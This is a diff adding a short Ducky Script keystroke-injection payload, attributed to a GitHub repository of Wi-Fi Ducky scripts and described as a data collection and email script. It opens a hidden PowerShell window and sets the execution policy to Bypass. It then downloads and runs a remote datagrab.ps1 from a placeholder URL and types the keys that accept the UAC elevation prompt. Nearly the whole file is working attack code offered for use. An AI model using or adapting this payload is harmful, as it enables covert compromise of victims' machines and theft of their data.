@@ -1,0 +1,18 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Data Collection and email script
+
+REM !! CHANGES REQUIRED !!
+REM <HOSTED URL> - URL to where datagrab.ps1 is hosted
+
+DEFAULTDELAY 15
+
+REM Setting up command in PS
+GUI r
+DELAY 200
+STRING powershell /w 1 /C Set-ExecutionPolicy Bypass;wget "<HOSTED URL>/datagrab.ps1" -o C:\\2643.ps1;C:\\2643.ps1
+DELAY 500
+
+REM UAC Prompt
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
